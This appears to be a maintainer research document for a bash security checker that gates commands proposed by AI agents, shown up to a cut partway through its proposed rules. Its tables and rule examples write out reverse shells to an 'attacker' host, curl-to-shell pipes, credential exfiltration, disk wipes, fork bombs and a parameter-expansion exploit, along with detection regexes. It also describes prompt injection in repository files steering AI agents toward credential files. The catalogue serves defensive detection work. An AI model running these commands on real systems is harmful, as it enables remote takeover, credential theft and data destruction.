# Bash Security Research — Patterns & Rules

**Audience:** maintainers of `Text::Treesitter::Bash::Security::Rule::*`.
**Purpose:** catalogue state-of-the-art bash security problems with focus on
**AI-agent tool-calling** and **untrusted bash input**, and recommend concrete
new rules for this distribution.
**Status:** research input — not normative. Rules recommended here are proposals.

---

## 0. Scope and threat model

`Text::Treesitter::Bash::Security::Checker` is intended for an
**approval-flow / sandbox-classifier** role: a parser-fronted gate that decides
whether a candidate bash snippet (proposed by an LLM, pasted from a chat, or
read from a repository file) should be allowed to run with or without
interactive approval. The threat model therefore differs from that of a
general linter:

| Aspect | Classic linter (shellcheck) | This checker |
|---|---|---|
| Threat actor | Author of the script | LLM + indirect prompt injection |
| Input | Static source code | Possibly-adversarial command snippets |
| Trust level | Semi-trusted developer | Often fully untrusted |
| Action on hit | Warn (developer decides) | Block / require extra approval |
| Concurrency | Whole file at once | One snippet at a time, often under a tight latency budget |

Two consequences follow:

1. **False-negatives are much more expensive** than for shellcheck. A missed
   `eval "$USER_INPUT"` is a remote-code-execution bug, not a style issue.
2. **We can be stricter than shellcheck.** It is acceptable (and preferable) to
   emit high-severity findings for patterns that shellcheck merely warns
   about (e.g. unquoted expansions in `rm $var`).

Where this document cites severity: `low` = cosmetic / hardening suggestion,
`medium` = footgun (likely exploit *if* combined with another flaw),
`high` = single-pattern exploit, **critical** = data-loss / RCE without
chaining (used only for the most extreme patterns; the rule contract supports
`low|medium|high` only — `critical` must be modelled as `high` in the rule and
escalated by the caller).

---

## 1. Inventory of existing rules (baseline)

Source: `lib/Text/Treesitter/Bash/Security/Rule/*.pm`.

| Rule | Detects | Severity ceiling |
|---|---|---|
| `DangerousFlags` | `-rf`, `--force --recursive` combos in `rm` | high |
| `EnvDangerousVars` | `export LD_PRELOAD=…`, `BASH_ENV=…`, `CDPATH=…` | high |
| `MissingAbsolutePath` | Commands without `/` prefix (whitelist) | low |
| `PathTraversal` | `..`, `/etc/../`, `/proc/../` literal sequences | high |
| `SensitiveAccess` | `/etc/shadow`, `~/.aws/`, `~/.kube/`, `/proc/self/…` | high |
| `UnquotedExpansion` | `$var` adjacent to `/` `-` `.` chars | medium |

Gaps addressed by the recommendations in §3-§14.

---

## 2. Risk categories

The catalog below is grouped by **risk category** (the column most useful for
policy-level decisions in an approval flow), then by **concrete bash pattern**
within each category. Each pattern lists:

- **Example** (the smallest script that triggers it)
- **Severity** (`low`/`medium`/`high`)
- **Why it matters** (one or two sentences, citing source)
- **Existing rule?** (`yes` / `no` / `partial`)

| # | Category | Severity range |
|---|---|---|
| 3 | Shellshock-class env-var abuse | high |
| 4 | Dynamic code execution (`eval`, `source`, `exec`) | high |
| 5 | Command-substitution as argument (unquoted `$(…)`, backticks) | high |
| 6 | Dangerous parameter expansion (`${!var}`, `${var@P}`) | high |
| 7 | Network → shell sinks (`curl … \| bash`, `wget … \| sh`) | high |
| 8 | Reverse-shell & bind-shell sinks (`nc -e`, `socat`, `bash -i`) | high |
| 9 | Inline interpreters with user input (`python -c $USER_INPUT`, `perl -e`) | high |
| 10 | Filesystem destruction (`rm -rf`, `dd of=/dev/sda`, `mkfs`) | high |
| 11 | Privilege escalation / suid (`chmod 777`, `chmod u+s`, `chown`, `sudo`) | high |
| 12 | Credential access (`~/.ssh/`, `~/.aws/`, `~/.kube/`, `~/.bash_history`) | high |
| 13 | DoS / fork bomb (`:(){ :\|:&};:`, `xargs -P` abuse) | medium |
| 14 | GTFOBins-style file-read/write sinks (`find -fprintf`, `tar cf -`) | medium |

A separate §15 covers **AI-agent-specific composite patterns** (where several
of the above combine) and §16 lists the **Top-10 recommended new rules** with
full code-level specifications.

---

## 3. Shellshock-class env-var abuse

Shellshock (CVE-2014-6271, [Wikipedia](https://en.wikipedia.org/wiki/Shellshock_(software_bug)),
[FFIEC alert](https://www.ffiec.gov/sites/default/files/media/press-releases/2014/FFIEC_JointStatement_BASH_Shellshock_Vulnerability.pdf))
demonstrated that bash inherits a number of environment variables that can
trigger arbitrary code execution or subvert the runtime. The pattern class is
still live — modern bash still honours `BASH_ENV`, `ENV`, `BASH_FUNC_*` (until
recently), and the dynamic loader still honours `LD_PRELOAD` / `LD_AUDIT`.

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `BASH_ENV` (non-interactive bash) | `BASH_ENV=/tmp/x.sh bash -c 'id'` | high | yes (EnvDangerousVars) |
| `ENV` (interactive sh) | `ENV=/tmp/x.sh sh` | high | yes |
| `LD_PRELOAD` | `LD_PRELOAD=/tmp/evil.so bash -c 'id'` | high | yes |
| `LD_AUDIT` | `LD_AUDIT=/tmp/evil.so ls` | high | yes |
| `DYLD_INSERT_LIBRARIES` (macOS) | `DYLD_INSERT_LIBRARIES=/tmp/evil.dylib ls` | high | yes |
| `IFS` manipulation | `IFS=/; cmd=cat$IFS/etc/passwd;$cmd` | high | **no** |
| `SHELLOPTS` / `PS4` | `PS4='$(id)'; bash -x script` | high | **no** |
| `PROMPT_COMMAND` | `export PROMPT_COMMAND='id > /tmp/p'` | medium | **no** |
| `CDPATH` | `export CDPATH=/tmp; cd evil` | low | yes (already low) |
| `GIT_DIR`, `GIT_WORK_TREE` | `GIT_DIR=/tmp/evil git status` | medium | partial |
| `PYTHONPATH`, `PERL5LIB`, `RUBYLIB`, `NODE_PATH` | `PYTHONPATH=/tmp/evil python foo.py` | high | **no** |
| `CLASSPATH` | `CLASSPATH=/tmp/evil.jar java Main` | medium | **no** |
| `TMPDIR` | `TMPDIR=/var/tmp python …` | low | **no** |

**Sources:** Shellshock CVE series, [Praetorian](https://www.praetorian.com/blog/critical-bash-shellshock-vulnerability/),
[Red Hat advisory](https://access.redhat.com/articles/1200223).

---

## 4. Dynamic code execution

These constructs take strings and re-parse them as code. Any time the string
is partially controllable, the result is remote code execution.

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `eval` | `eval "$USER_INPUT"` | high | **no** |
| `eval` of substitution | `eval $(curl http://x)` | high | **no** |
| `source` / `.` | `source /tmp/x.sh`, `. <(curl http://x)` | high | **no** |
| `exec` of computed argv | `exec $CMD` | high | **no** |
| `bash -c`, `sh -c` with user input | `bash -c "$USER_INPUT"` | high | **no** |
| `bash -c` with concatenation | `bash -c "cat $FILE"` | high | **no** |
| Heredoc piped to interpreter | `ssh host bash <<< "$USER_INPUT"` | high | **no** |
| `xargs sh -c` | `echo "$USER_INPUT" \| xargs sh -c` | high | **no** |
| `awk` / `mawk` `system()` | `mawk 'BEGIN{system("/bin/sh")}'` | high | **no** |
| `sed` `e` flag (GNU) | `sed 's/.*/sh &/e' <<< "$x"` | high | **no** |
| `perl -e`, `python -c`, `ruby -e` (see §9) | (below) | high | **no** |

`eval` and friends are how `shellcheck`’s SC2002/SC2086 advisories turn into
exploits when combined with untrusted input. Sources: [OWASP Command
Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html),
[GTFOBins](https://gtfobins.org/).

---

## 5. Command substitution as argument

Even without `eval`, an unquoted command substitution is enough to weaponise
most commands (cf. SC2046, [ShellCheck SC2046](https://www.shellcheck.net/wiki/SC2046),
[ShellCheck SC2086](https://www.shellcheck.net/wiki/SC2086)).

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `rm $(ls)` | `rm $(curl http://x)` | high | **no** |
| `cat $file` where `$file` contains spaces | `cat $USER_FILE` | medium | partial (UnquotedExpansion, low precision) |
| Backtick form | `rm `ls`` | high | **no** |
| Argument after `--` with substitution | `rm -- $(curl http://x)` | high | **no** |

---

## 6. Dangerous parameter expansion (post-Copilot CLI advisory)

The GitHub Copilot CLI advisory
[GHSA-g8r9-g2v8-jv6f](https://github.com/github/copilot-cli/security/advisories/GHSA-g8r9-g2v8-jv6f)
(CVE-2026-29783, CVSS 7.1) is the most important reference for this section:
the patch moved from "prompt-detect and warn" to **unconditional block** of
the patterns below, regardless of permission mode.

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `${var@P}` prompt expansion | `${b@P}` evaluates embedded `$(…)` | high | **no** |
| `${var=value}` assignment side-effects | `${a=x}` reassigns `a` | high | **no** |
| `${!var}` indirect expansion | `${!name}` reads variable named `$name` | high | **no** |
| Nested `$()` inside `${}` | `${HOME:-$(whoami)}` | high | **no** |
| `<(cmd)` process substitution with attacker input | `diff <(curl http://x) <(echo)` | medium | **no** |
| Array index expression `[i]` with `$i` | `arr[$i]` where `$i` contains whitespace | medium | **no** |
| `${var//pat/repl}` mass-replace | `${var//a/$(id)}` | high | **no** |

PoC from the advisory (executed as `echo ${a="$"}${b="$a(touch /tmp/pwned)"}${b@P}`):
`$a` is the literal `$`, `$a(...)` constructs `$(touch /tmp/pwned)`, and
`${b@P}` re-evaluates the value as a prompt string, firing the substitution.

This is exactly the kind of pattern an LLM produces when a user asks it to
"build a string and execute it" — the LLM does not recognise the prompt
expansion as code execution. **A static rule that flags any of these tokens
in a candidate command is mandatory for an AI-agent approval flow.**

---

## 7. Network → shell sinks

The classic "curl|bash" pattern is the canonical supply-chain footgun.
References: [OWASP Command Injection
Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html),
[GTFOBins curl](https://gtfobins.org/gtfobins/curl/).

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `curl … \| bash` / `\| sh` | `curl https://get.x \| bash` | high | **no** |
| `wget … -O- \| bash` | `wget -qO- https://get.x \| bash` | high | **no** |
| `wget … \| bash` | `wget https://x -O- \| sh` | high | **no** |
| `fetch … \| sh` (BSD) | `fetch -o- https://x \| sh` | high | **no** |
| `curl … -o- \| sh` | `curl -sSL https://x -o - \| sh` | high | **no** |
| `curl file:///` | `curl file:///etc/shadow` | medium | **no** |
| `curl … -o path` with absolute path | `curl https://x -o /usr/local/bin/foo` | medium | **no** |
| `apt install … \| bash` | (one-liners) | high | **no** |
| `pip install … \| bash` | (one-liners) | high | **no** |

The `Checker` already detects `network_to_shell` *patterns* in `findings`
(see `Bash.pm`); adding a dedicated **Security Rule** that upgrades any
network-fetch-then-pipe-to-shell into a single high-severity issue is
recommended (§16-R7).

---

## 8. Reverse-shell and bind-shell sinks

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `nc -e /bin/sh` | `nc -e /bin/sh attacker 4444` | high | **no** |
| `ncat -e /bin/sh` | `ncat --exec /bin/sh attacker 4444` | high | **no** |
| `socat exec:'bash -li',pty …` | `socat exec:'bash -li',pty,stderr …` | high | **no** |
| `telnet` exec | `telnet attacker 4444 \| /bin/sh` | high | **no** |
| `ssh -o ProxyCommand=…` | `ssh -o ProxyCommand="sh -i >&1 0>&2 host" host` | high | **no** |
| `bash -i >& /dev/tcp/…` | `bash -i >& /dev/tcp/attacker/4444 0>&1` | high | **no** |
| `python -c '…socket…'` | (see §9) | high | **no** |
| `perl -MIO -e '…'` | (see §9) | high | **no** |
| `awk 'BEGIN{system("…")}'` | (see §4) | high | **no** |

The `bash -i >& /dev/tcp/` form is the canonical bash-only reverse shell; a
regex on the *source text* `>&[[:space:]]*/dev/tcp/` is sufficient.

Sources: [GTFOBins nc](https://gtfobins.org/gtfobins/nc/), [MITRE ATT&CK
T1059.004](https://attack.mitre.org/techniques/T1059/004/).

---

## 9. Inline interpreters with user input

A single line of `python -c` or `perl -e` is a reverse shell, file reader,
or network exfiltrator. These are listed separately from §4 because the
shell-execution construct is *inside* a single command, and the `command`
field will name `python`, `perl`, etc., not `eval`.

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `python -c $USER_INPUT` | `python -c "$INPUT"` | high | **no** |
| `python -c 'subprocess…'` | `python -c 'import os; os.system("id")'` | high | **no** |
| `perl -e $USER_INPUT` | `perl -e "exec 'sh'"` | high | **no** |
| `ruby -e $USER_INPUT` | `ruby -e 'exec "/bin/sh"'` | high | **no** |
| `node -e $USER_INPUT` | `node -e 'require("child_process").exec("id")'` | high | **no** |
| `php -r $USER_INPUT` | `php -r 'system("id");'` | high | **no** |
| `lua -e $USER_INPUT` | `lua -e 'os.execute("id")'` | high | **no** |
| `bash -c $USER_INPUT` (explicit) | (see §4) | high | **no** |
| `osascript -e '…do shell script…'` | (macOS, escapes bash layer) | high | **no** |
| `awk 'BEGIN{system(…)}'` | (see §4) | high | **no** |

The trigger is *two* conditions: (a) interpreter named with `-c`/`-e`/`-r`
flag, AND (b) any of the argv tokens contains `$` or `"` (suggesting
substitution).

---

## 10. Filesystem destruction

`DangerousFlags` already covers `rm -rf` combinations. The table below lists
*adjacent* patterns that should belong in the same rule family (or a new
`FilesystemDestruction` rule).

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `rm -rf /` | `rm -rf /` | high | partial (DangerousFlags sees `-rf`) |
| `rm -rf /*` | `rm -rf /*` | high | partial |
| `rm -rf ~` / `~user` | `rm -rf ~` | high | partial |
| `rm -rf $VAR` | `rm -rf $USER_INPUT` | high | **no** (UnquotedExpansion low) |
| `dd of=/dev/sdX` | `dd if=/dev/zero of=/dev/sda bs=1M` | high | **no** |
| `dd of=/dev/nvmeXnY` | (same) | high | **no** |
| `dd of=/dev/disk` (macOS) | (same) | high | **no** |
| `mkfs` / `mkfs.ext4` / `mkfs.xfs` | `mkfs.ext4 /dev/sda` | high | **no** |
| `fdisk` / `parted` / `sgdisk` | `parted /dev/sda mklabel gpt` | high | **no** |
| `mkswap` | `mkswap /dev/sda` | medium | **no** |
| `mv /` | `mv /etc /tmp/evil` (data loss + DoS) | high | **no** |
| `>` overwrite to absolute path | `: > /etc/passwd` | high | **no** |
| `: > /var/log/…` (log tampering) | `: > /var/log/auth.log` | medium | **no** |
| `truncate -s 0` on absolute path | `truncate -s 0 /etc/shadow` | high | **no** |
| `install -m 777` | `install -m 777 evil /usr/local/bin/` | medium | **no** |
| `cp /dev/zero` | `cp /dev/zero /tmp/fill` (DoS) | medium | **no** |
| `chattr +i /etc/passwd` (DoS variant) | `chattr +i /etc/resolv.conf` | medium | **no** |

Sources: [MITRE ATT&CK T1059.004 — Campaign C0063 (2025 Poland Wiper
Attacks)](https://attack.mitre.org/techniques/T1059/004/) — uses `dd` to
overwrite disks.

---

## 11. Privilege escalation / suid

Sources: [GTFOBins chmod](https://gtfobins.org/gtfobins/chmod/),
[GTFOBins find](https://gtfobins.org/gtfobins/find/),
[GTFOBins env](https://gtfobins.org/gtfobins/env/).

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| `chmod 777` recursive | `chmod -R 777 /` | high | **no** |
| `chmod 777` single | `chmod 777 /etc/passwd` | high | **no** |
| `chmod u+s` | `chmod u+s /tmp/evil` | high | **no** |
| `chmod g+s` | `chmod g+s /tmp/dir` | medium | **no** |
| `chmod +s` | `chmod +s /tmp/evil` | high | **no** |
| `chown root` | `chown root:root /tmp/evil` | high | **no** |
| `sudo` invocation (any) | `sudo apt install` | medium | **no** |
| `sudo` with dangerous binary | `sudo find . -exec sh \;` | high | **no** |
| `sudo -i` / `sudo -s` | `sudo -i` | high | **no** |
| `doas` | `doas sh` | medium | **no** |
| `pkexec` | `pkexec sh` | high | **no** |
| `env /bin/sh` (gtfobins) | `env /bin/sh` | high | **no** |
| `find -exec /bin/sh` (gtfobins) | `find . -exec /bin/sh \;` | high | **no** |
| `find -fprintf` (file write) | `find / -fprintf /etc/cron.d/evil "%s\n" -quit` | high | **no** |
| `tar` / `zip` writing to `/etc/cron.d/` | `tar cf /etc/cron.d/evil.tar …` | medium | **no** |
| `crontab -` | `echo "* * * * * sh -i" \| crontab -` | high | **no** |
| `at now` | `echo "sh -i" \| at now` | high | **no** |
| `systemctl enable` | `systemctl enable evil.service` | medium | **no** |

---

## 12. Credential access

The `SensitiveAccess` rule covers a useful subset but the catalogue should be
significantly broader for AI-agent flows (where leaked credentials are the
typical exfiltration target, not full code execution).

| Path / token | Severity | Existing rule? |
|---|---|---|
| `/etc/shadow` | high | yes |
| `/etc/sudoers` / `/etc/sudoers.d/` | high | yes |
| `~/.ssh/` (any file) | high | yes |
| `~/.aws/` (credentials, config) | high | yes |
| `~/.kube/` (config) | high | yes |
| `~/.docker/config.json` | high | **no** |
| `~/.gnupg/` (private-keys-v1.d, secring.gpg, private-keys) | high | **no** |
| `~/.bash_history` / `~/.zsh_history` | medium | **no** |
| `~/.netrc` | high | **no** |
| `~/.pypirc` | high | **no** |
| `~/.npmrc` (token=…) | high | **no** |
| `~/.cargo/credentials` | high | **no** |
| `~/.git-credentials` | high | **no** |
| `~/.config/gh/hosts.yml` (GitHub CLI token) | high | **no** |
| `~/.config/gcloud/application_default_credentials.json` | high | **no** |
| `~/.azure/` (Azure tokens) | high | **no** |
| `~/.docker/config.json` | high | **no** |
| `/proc/self/environ` | high | **no** |
| `/proc/*/environ` (process env dump) | high | **no** |
| `~/.password-store/` (pass) | medium | **no** |
| `~/.local/share/keyring/` | medium | **no** |
| `*.pem`, `*.key`, `id_rsa`, `id_ed25519` | high | **no** |
| Tokens inline: `curl -H "Authorization: Bearer …"` | high | **no** |

Sources: [MITRE ATT&CK T1552 — Unsecured
Credentials](https://attack.mitre.org/techniques/T1552/) (lists
`.bash_history`, `.zsh_history`, `.netrc`, `.npmrc`, `.pypirc`,
`.aws/credentials`, `.git-credentials`, etc.). Recommendation: split the
existing single `SensitiveAccess` rule into three narrower rules
(`SensitiveAccessPath`, `SensitiveCredentialAccess`, `ProcEnvAccess`) — easier
to allow-list selectively per environment.

---

## 13. DoS / resource exhaustion / fork bomb

| Pattern | Example | Severity | Existing rule? |
|---|---|---|---|
| Fork-bomb function | `:(){ :\|:&};:` | high | **no** |
| `ulimit -n unlimited` | `ulimit -n unlimited; :(){ :\|:&};:` | high | **no** |
| `xargs -P` (high parallelism) | `xargs -P 99999 -n 1 …` | medium | **no** |
| `yes` to a pipe (memory blowup) | `yes \| some_slow_consumer` | medium | **no** |
| `find /` (full-FS scan) | `find / -name …` | low | **no** |
| `tar cf /dev/null` of large dir | `tar -cf /dev/null /` | medium | **no** |
| `dd of=/dev/shm` (RAM fill) | `dd if=/dev/urandom of=/dev/shm/big bs=1M` | medium | **no** |
| `(while true; do …; done)` infinite loop | (no end condition) | medium | **no** |
| `:() { … }; :` recursive self-call | (variant of fork bomb) | high | **no** |

Detection strategy: regex on source for `:\(\)\{`, `: \(\)`, `while.*do.*done`
without obvious break, `ulimit.*unlimited`, `yes \|`.

---

## 14. GTFOBins-style file-read / file-write sinks

These are commands that *by themselves* are not dangerous, but which (per
[GTFOBins](https://gtfobins.org/)) can be coerced into shell, file read, or
file write primitives. In an approval flow, even the read variants matter
because they bypass file ACLs in many sudo configurations.

| Binary | Pattern | Severity | Existing rule? |
|---|---|---|---|
| `find` | `-exec /bin/sh`, `-exec … sh …`, `-fprintf` | high | **no** |
| `find` | `-exec` with `\;` argument | low (legitimate use) | **no** |
| `awk` / `mawk` / `gawk` | `system(`, `BEGIN{system(`, `\| getline` | high | **no** |
| `sed` | `e` flag (GNU), `r`/`w` commands to absolute paths | high | **no** |
| `xargs` | `xargs sh -c`, `xargs -I{} sh -c` | high | **no** |
| `tar` | `tar -cf /tmp/x.tar /etc/shadow` | medium | **no** |
| `zip` / `unzip` | `zip /tmp/x.zip /etc/shadow` | medium | **no** |
| `rsync` | `rsync /etc/shadow attacker:/loot/` | high | **no** |
| `git` | `git config core.hooksPath /tmp/evil` | high | **no** |
| `vim` / `vi` | `:!sh`, `:r /etc/shadow`, `:w /etc/cron.d/x` | high | **no** |
| `less` / `more` / `man` | `!sh`, `:e /etc/shadow` | high | **no** |
| `nano` | `^R /etc/shadow`, `^X sh` | medium | **no** |
| `python` / `perl` / `ruby` (without `-c`) | `python -` then stdin with code | high | **no** |
| `openssl` | `openssl enc -in /etc/shadow` | medium | **no** |
| `base64` | `base64 /etc/shadow` (exfiltration) | medium | **no** |
| `xxd` / `od` | (same, read-as-hex) | medium | **no** |
| `strace` | `strace -e openat …` (read trace) | medium | **no** |
| `ltrace` | (same) | medium | **no** |
| `gdb` | `gdb -batch -ex 'call (void)system("sh")'` | high | **no** |
| `tmux` / `screen` | `tmux new -d "sh"` | high | **no** |
| `ssh` | `ssh user@host "sh -i"` (untrusted host) | medium | **no** |
| `scp` / `sftp` | to attacker host | medium | **no** |

---

## 15. AI-agent-specific composite patterns

A single LLM-generated command frequently concatenates two or three of the
above into a one-liner that no static rule sees in isolation. The composite
patterns below are the most common observed in incident reports and in the
[GitHub Copilot CLI advisory](https://github.com/github/copilot-cli/security/advisories/GHSA-g8r9-g2v8-jv6f).

| Composite | Example | Severity | Detection |
|---|---|---|---|
| **Unquoted user arg into destructive command** | `rm -rf $1`, `rm -rf $USER_INPUT` | high | argv contains `$VAR` *and* command in destroy-list |
| **Network fetch → execute** | `curl https://x \| bash`, `wget -qO- https://x \| sh` | high | argv chain (already partly in `findings`) |
| **base64-decoded piped to shell** | `base64 -d <<< $X \| sh`, `echo X \| base64 -d \| bash` | high | source regex |
| **eval with user input** | `eval "$USER_INPUT"`, `eval $1` | high | command=`eval` *and* argv contains `$` |
| **python -c with user input** | `python -c "$USER_INPUT"` | high | command in interpreter list *and* `-c` *and* argv has `$` |
| **ssh with remote command** | `ssh user@host 'rm -rf $X'` | medium | command=`ssh` *and* argv contains remote pattern with `$` |
| **clone + cd + run install** | `git clone URL && cd repo && ./install.sh` | medium | `after_op=&&` chain with `git clone`, `cd`, `./` |
| **download + chmod + run** | `curl -o /tmp/x URL && chmod +x /tmp/x && /tmp/x` | high | three-command chain (curl → chmod +x → exec) |
| **heredoc to interpreter** | `bash <<< "$USER_INPUT"`, `python <<< "$USER_INPUT"` | high | command in interpreter list *and* source contains `<<<` *and* `$` |
| **`xargs` with shell** | `echo "$USER_INPUT" \| xargs sh -c …` | high | `xargs` argv contains `sh` *and* source has `$` |
| **`find -exec` with shell** | `find / -name x -exec sh -c 'cmd $X' \;` | high | `find` argv contains `-exec` *and* shell token |
| **process substitution to interpreter** | `bash <(curl http://x)` | high | command in interpreter list *and* source contains `<(` *and* fetch token |
| **`$IFS` redirection trick** | `IFS=/; cmd=cat$IFS/etc/passwd;$cmd` | high | source contains `IFS=` *and* token containing `$IFS` |

Several of these are **callers of multiple existing rules** — the value of a
dedicated rule is that it returns a single high-severity issue with a
human-readable composite message, instead of N low/medium issues that an
automated approver may dismiss.

---

## 16. Top-10 recommended new rules

Each rule below is specified to the level required for implementation
(name, severity, file path, trigger condition, example, expected issue
hash). Order is by **expected risk reduction** in a typical AI-agent
approval flow.

### R1 — `DangerousExpansion` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/DangerousExpansion.pm`
- **Why:** the single most exploited class in the Copilot CLI advisory
  ([GHSA-g8r9-g2v8-jv6f](https://github.com/github/copilot-cli/security/advisories/GHSA-g8r9-g2v8-jv6f)).
  These patterns look like harmless variable math but resolve to arbitrary
  code execution.
- **Trigger:** source contains any of:
  - `\$\{[^}]+@P\b` (prompt expansion)
  - `\$\{!?[a-zA-Z_][a-zA-Z0-9_]*[!}]=` (assignment / indirect in same node)
  - `\$\{[^}]+//[^}]*\$\(` (replace-with-substitution)
  - `\$\{[a-zA-Z_][a-zA-Z0-9_]*\s*\[` (array index with computed expr)
- **Severity:** high
- **Example:**
  ```bash
  echo ${a="$"}${b="$a(touch /tmp/pwned)"}${b@P}
  ```
- **Issue:** `{ rule => 'DangerousExpansion', severity => 'high', message => "Dangerous parameter expansion (CVE-2026-29783 class): ...", source => ... }`

### R2 — `NetworkToShell` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/NetworkToShell.pm`
- **Why:** the canonical supply-chain exploit. Already detectable in
  `findings` but not exposed as a Security Rule; needed so that callers
  can require extra approval uniformly.
- **Trigger:** command is `curl`/`wget`/`fetch` and `after_op` is `|`
  *and* the next command is `bash`/`sh`/`dash`/`zsh`/`ksh`/`ash`/`fish`
  (use the `commands` API, not just the local node).
- **Severity:** high
- **Examples:**
  ```bash
  curl https://get.example.com | bash
  wget -qO- https://get.example.com | sh
  fetch -o- https://get.example.com | sh
  ```

### R3 — `DynamicEval` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/DynamicEval.pm`
- **Why:** `eval` is the single most reliable RCE primitive. The rule
  fires on the command name; severity escalates to high if any argv
  token contains `$` or `$(` or backtick.
- **Trigger:**
  - `command` ∈ `{ eval, exec }` → medium
  - `command` ∈ `{ eval, exec }` and any argv token contains `\$|\$\(|\`` → high
  - `command` ∈ `{ source, . }` (only literal `.`) and argv is a single
    unquoted path containing `$` or `$(` → high
- **Severity:** medium (escalates to high with substitution)
- **Examples:**
  ```bash
  eval $USER_INPUT                     # high
  exec $CMD                            # high
  source <(curl http://x)              # high
  . /tmp/x.sh                          # low
  ```

### R4 — `ShellInterpreterFlag` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/ShellInterpreterFlag.pm`
- **Why:** bash/python/perl/ruby/node/php/lua/ruby invoked with
  `-c`/`-e`/`-r` and a string that contains `$` is the universal
  reverse-shell primitive.
- **Trigger:** command ∈ `{ bash, sh, dash, zsh, ksh, ash, fish, python,
  python2, python3, perl, ruby, node, php, lua, awk, mawk, gawk, sed,
  osascript }` *and* argv contains a flag from
  `{ -c, -e, -r, --command, --eval }` *and* the *next* argv token
  contains `\$|\$\(|\``.
- **Severity:** high
- **Examples:**
  ```bash
  bash -c "$USER_INPUT"
  python -c "import os; os.system('id')"
  perl -e "exec '/bin/sh'"
  node -e 'require("child_process").exec("id")'
  ```

### R5 — `ReverseShellSink` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/ReverseShellSink.pm`
- **Why:** no legitimate agent tool-call should ever spawn a reverse
  shell. Even in dev workflows, this is one of the strongest
  indicator-of-compromise signals.
- **Trigger:** source matches any of:
  - `\bbash\s+-i\b` with any `>&` redirection to `/dev/tcp/`
  - `\bnc(?:at)?\b` with `-e|--exec|-c`
  - `\bsocat\b` with `exec:`
  - `\btelnet\b` followed by `\|` and a shell
  - `\bssh\b` with `ProxyCommand`
  - `\b(?:python|perl|ruby)\b` argv containing `socket` or `IO::Socket`
- **Severity:** high
- **Examples:**
  ```bash
  bash -i >& /dev/tcp/attacker/4444 0>&1
  nc -e /bin/sh attacker 4444
  socat exec:'bash -li',pty,stderr,0>&1 …
  python -c 'import socket,subprocess,os;…'
  ```

### R6 — `DangerousFilesystem` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/DangerousFilesystem.pm`
- **Why:** extends `DangerousFlags` to cover `dd of=/dev/…`, `mkfs`,
  `> /etc/…`, `truncate -s 0`, etc.
- **Trigger:**
  - `command=dd` and any argv matches `/^of=\/dev\//` or contains `/dev/sd|/dev/nvme|/dev/disk`
  - `command` matches `/^mkfs(?:\.[a-z0-9]+)?$/` → high
  - `command` ∈ `{ parted, fdisk, sfdisk, sgdisk }` → high
  - source matches `/^:?\s*>\s*\/(?:etc|var|boot|usr|sys|proc)\//` → high
  - `command=truncate` and argv contains `-s 0` and an absolute path → high
  - `command=chattr` and argv contains `+i` and an absolute path under `/etc` → medium
- **Severity:** high
- **Examples:**
  ```bash
  dd if=/dev/zero of=/dev/sda bs=1M
  mkfs.ext4 /dev/sda
  : > /etc/passwd
  truncate -s 0 /var/log/auth.log
  ```

### R7 — `PrivilegeEscalation` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/PrivilegeEscalation.pm`
- **Why:** GTFOBins (`find -exec sh`, `env /bin/sh`, `chmod u+s`) and the
  whole family of "innocent-looking command that turns into root".
- **Trigger:**
  - command starts with `sudo` → medium (always); high if next word
    is in `{ find, awk, mawk, gawk, perl, python, ruby, node, env,
    bash, sh, zsh, vi, vim, less, more, nmap }`
  - argv matches `chmod` and any arg matches `/^[-+]?[0-7]*[7][7][7]$/`
    or `/^[ugoa]*\+s$/` or `/^[ugoa]*u\+s$/`
  - argv matches `chown` with first argument ending in `:root` or
    containing `root`
  - command is `find` and argv contains `-exec` followed by a shell
    token (`sh`, `bash`, `zsh`, …) → high
  - command is `env` followed by a shell path → high
  - command is `crontab` and source contains `crontab -` → high
  - command is `at` and source contains `at now` or `at -f` → high
- **Severity:** medium or high per trigger
- **Examples:**
  ```bash
  sudo find . -exec /bin/sh \; -quit
  sudo -i
  chmod u+s /tmp/evil
  chown root /tmp/evil
  env /bin/sh
  echo "* * * * * sh -i" | crontab -
  ```

### R8 — `CredentialAccess` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/CredentialAccess.pm`
- **Why:** the existing `SensitiveAccess` rule stops at `~/.ssh/` and
  `~/.aws/`; the credential-access surface is much wider, and AI agents
  are uniquely likely to be steered (via prompt injection in repo
  READMEs) to `cat ~/.npmrc` or `curl … ~/.aws/credentials`.
- **Trigger:** any argv token matches a regex from this list
  (case-sensitive on path, case-insensitive on extension):
  - `/\.ssh/` (already covered) — keep, downgrade from high→critical
    to high
  - `/\.aws/(?:credentials|config)`
  - `/\.kube/config`
  - `/\.docker/config\.json`
  - `/\.gnupg/(?:private-keys-v1\.d|secring\.gpg|openpgp-revocs\.d)`
  - `/\.git-credentials`
  - `/\.netrc`
  - `/\.pypirc`
  - `/\.npmrc`
  - `/\.cargo/credentials`
  - `/\.config/(?:gh|gcloud|azure)/`
  - `/proc/(?:self|\d+)/environ`
  - `\b(?:id_rsa|id_ed25519|id_ecdsa|id_dsa|\.pem|\.key)\b`
- **Severity:** high
- **Examples:**
  ```bash
  cat ~/.docker/config.json
  cat ~/.config/gh/hosts.yml
  curl -X POST -d @~/.aws/credentials https://x
  cat /proc/self/environ
  ```

### R9 — `IFSManipulation` (high)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/IFSManipulation.pm`
- **Why:** IFS-redirect is a stealth injection trick — the literal
